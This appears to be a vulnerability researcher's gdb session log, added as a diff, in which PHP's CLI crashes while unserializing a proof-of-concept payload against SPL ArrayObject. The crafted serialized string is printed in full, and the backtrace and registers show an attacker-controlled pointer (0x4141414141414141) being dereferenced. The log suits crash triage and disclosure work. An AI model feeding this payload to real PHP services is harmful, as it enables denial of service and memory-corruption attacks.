@@ -1,0 +1,85 @@
+(gdb) r deserialise.php ~/Git/EntomologyPrivate/PHP/spl_array_unserialize_pflags/poc.sz 
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/sean/Git/php-src/sapi/cli/php deserialise.php ~/Git/EntomologyPrivate/PHP/spl_array_unserialize_pflags/poc.sz
+a:3:{i:0;C:11:"ArrayObject":20:{x:i:0;r:3;;m:a:0:{};}i:1;d:11;i:2;S:31:"AAAAAAAABBBBCCCC\01\00\00\00\04\00\00\00\00\00\00\00\00\00\00";}
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000081d906 in zend_hash_destroy (ht=0x4141414141414141) at /home/sean/Git/php-src/Zend/zend_hash.c:543
+543		p = ht->pListHead;
+(gdb) bt
+#0  0x000000000081d906 in zend_hash_destroy (ht=0x4141414141414141) at /home/sean/Git/php-src/Zend/zend_hash.c:543
+#1  0x0000000000808674 in _zval_dtor_func (zvalue=0x7ffff7fc9e18) at /home/sean/Git/php-src/Zend/zend_variables.c:45
+#2  0x00000000007f3b1f in _zval_dtor (zvalue=0x7ffff7fc9e18) at /home/sean/Git/php-src/Zend/zend_variables.h:35
+#3  i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9e18) at /home/sean/Git/php-src/Zend/zend_execute.h:79
+#4  _zval_ptr_dtor (zval_ptr=0x7ffff7fc9c60) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+#5  0x000000000069fe60 in spl_array_object_free_storage (object=0x7ffff7fc9c40) at /home/sean/Git/php-src/ext/spl/spl_array.c:152
+#6  0x000000000084aeb0 in zend_objects_store_del_ref_by_handle_ex (handle=1, handlers=0x1055280 <spl_handler_ArrayObject>)
+    at /home/sean/Git/php-src/Zend/zend_objects_API.c:226
+#7  0x000000000084ab3e in zend_objects_store_del_ref (zobject=0x7ffff7fc9c10) at /home/sean/Git/php-src/Zend/zend_objects_API.c:178
+#8  0x00000000008086ad in _zval_dtor_func (zvalue=0x7ffff7fc9c10) at /home/sean/Git/php-src/Zend/zend_variables.c:57
+#9  0x00000000007f3b1f in _zval_dtor (zvalue=0x7ffff7fc9c10) at /home/sean/Git/php-src/Zend/zend_variables.h:35
+#10 i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9c10) at /home/sean/Git/php-src/Zend/zend_execute.h:79
+#11 _zval_ptr_dtor (zval_ptr=0x7ffff7fc9d50) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+#12 0x000000000081d949 in zend_hash_destroy (ht=0x7ffff7fca4f8) at /home/sean/Git/php-src/Zend/zend_hash.c:548
+#13 0x0000000000808674 in _zval_dtor_func (zvalue=0x7ffff7fc9b80) at /home/sean/Git/php-src/Zend/zend_variables.c:45
+#14 0x00000000007f3b1f in _zval_dtor (zvalue=0x7ffff7fc9b80) at /home/sean/Git/php-src/Zend/zend_variables.h:35
+#15 i_zval_ptr_dtor (zval_ptr=0x7ffff7fc9b80) at /home/sean/Git/php-src/Zend/zend_execute.h:79
+#16 _zval_ptr_dtor (zval_ptr=0x7ffff7fc9f68) at /home/sean/Git/php-src/Zend/zend_execute_API.c:424
+#17 0x000000000081c0af in i_zend_hash_bucket_delete (p=0x7ffff7fc9f50, ht=0x10583e8 <executor_globals+360>) at /home/sean/Git/php-src/Zend/zend_hash.c:182
+#18 zend_hash_bucket_delete (ht=0x10583e8 <executor_globals+360>, p=0x7ffff7fc9f50) at /home/sean/Git/php-src/Zend/zend_hash.c:192
+#19 0x000000000081dbbe in zend_hash_graceful_reverse_destroy (ht=0x10583e8 <executor_globals+360>) at /home/sean/Git/php-src/Zend/zend_hash.c:613
+#20 0x00000000007f32cf in shutdown_executor () at /home/sean/Git/php-src/Zend/zend_execute_API.c:244
+#21 0x000000000080ab04 in zend_deactivate () at /home/sean/Git/php-src/Zend/zend.c:960
+#22 0x00000000007754fd in php_request_shutdown (dummy=0x0) at /home/sean/Git/php-src/main/main.c:1883
+#23 0x000000000093da87 in do_cli (argc=3, argv=0x105c940) at /home/sean/Git/php-src/sapi/cli/php_cli.c:1177
+#24 0x000000000093e31e in main (argc=3, argv=0x105c940) at /home/sean/Git/php-src/sapi/cli/php_cli.c:1378
+(gdb) i r
+rax            0x4141414141414141	4702111234474983745
+rbx            0x0	0
+rcx            0x310f47bd3f	210709757247
+rdx            0x4141414141414141	4702111234474983745
+rsi            0x7ffff7fc9e48	140737353915976
+rdi            0x4141414141414141	4702111234474983745
+rbp            0x7fffffffb090	0x7fffffffb090
+rsp            0x7fffffffb070	0x7fffffffb070
+r8             0x10582a0	17138336
+r9             0x8	8
+r10            0x22b	555
+r11            0x7ffff70b3e30	140737338097200
+r12            0x4207d0	4327376
+r13            0x7fffffffdbb0	140737488346032
+r14            0x0	0
+r15            0x0	0
+rip            0x81d906	0x81d906 <zend_hash_destroy+16>
+eflags         0x10202	[ IF RF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/i $rip
+=> 0x81d906 <zend_hash_destroy+16>:	mov    rax,QWORD PTR [rax+0x20]
+(gdb) l
+538	
+539		IS_CONSISTENT(ht);
+540	
+541		SET_INCONSISTENT(HT_IS_DESTROYING);
+542	
+543		p = ht->pListHead;
+544		while (p != NULL) {
+545			q = p;
+546			p = p->pListNext;
+547			if (ht->pDestructor) {
+(gdb) 
+548				ht->pDestructor(q->pData);
+549			}
+550			if (q->pData != &q->pDataPtr) {
+551				pefree(q->pData, ht->persistent);
+552			}
+553			pefree(q, ht->persistent);
+554		}
+555		if (ht->nTableMask) {
+556			pefree(ht->arBuckets, ht->persistent);
+557		}
+(gdb) 
